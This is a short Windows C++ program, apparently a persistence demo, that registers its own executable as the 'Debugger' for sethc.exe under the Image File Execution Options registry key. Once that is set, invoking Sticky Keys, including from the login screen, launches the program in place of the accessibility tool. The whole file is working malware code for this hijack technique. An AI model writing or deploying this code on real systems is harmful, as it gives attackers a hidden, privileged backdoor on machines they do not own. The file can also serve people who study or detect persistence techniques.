#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <string.h>
#include <list>
#include <vector>
#include <ShlObj.h>
#include <winreg.h>

int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	MessageBoxW(NULL, L"Image hijack", L"Persistence", MB_OK);

	HKEY hkey = NULL;
	WCHAR szCurrentPath[MAX_PATH];
	GetModuleFileNameW(NULL, szCurrentPath, MAX_PATH);

	LPCWSTR subKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
	LONG res = RegCreateKeyW(HKEY_LOCAL_MACHINE, subKey, &hkey);
	if (res == ERROR_SUCCESS){
		DWORD cbData = (lstrlenW(szCurrentPath) + 1)*sizeof(WCHAR);
		RegSetValueExW(hkey, L"Debugger", 0, REG_SZ, (const BYTE*)szCurrentPath, cbData);
		RegCloseKey(hkey);
	}

	return 0;
}